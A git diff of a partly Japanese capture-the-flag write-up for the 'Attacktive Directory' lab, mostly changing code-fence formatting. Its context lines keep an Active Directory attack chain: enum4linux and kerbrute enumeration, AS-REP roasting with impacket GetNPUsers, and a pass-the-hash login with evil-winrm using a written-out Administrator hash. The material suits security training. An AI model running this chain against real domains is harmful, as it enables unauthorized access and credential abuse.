@@ -30,10 +30,9 @@ High-quality reconnaissance narrows a large attack surface into a few validated 
 
 ### Not implemented (not recorded in PDF)
 
-```
 
 ## Nmap
-```
+```bash
 nmap -sV -sT -sC $ip
 ```
 
@@ -44,7 +43,7 @@ nmap -sV -sT -sC $ip
 PDFメモから抽出した主要コマンドと要点を整理しています。必要に応じて後続で詳細追記してください。
 
 ### 実行コマンド（抽出）
-```
+```bash
 enum4linux -A $ip
 ~/tools/kerbrute userenum -d spookysec.local --dc $ip userlist.txt -t 100
 python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/ -no-pass -usersfile userlist.txt
@@ -59,7 +58,7 @@ evil-winrm -i $ip -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
 画像抽出なし（PDF内に有効な埋め込み画像なし）
 
 ### 抽出メモ（先頭120行）
-```
+```bash
 Attacktive Directory
 July 30, 2024 2:43
 
@@ -180,6 +179,7 @@ SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com<ma
 https://github.com/ShawnDEvans/smbmap
 [\] Checking for open ports...                                                                                     [|] Checking for open ports...
 Checking for open ports...                                                                                     [-] Checking for open ports...
+```
 
 💡 Why this works  
 Initial access succeeds when enumeration findings are turned into a practical exploit chain. Capturing credentials, file disclosure, or direct RCE creates reliable pivot points for privilege escalation.
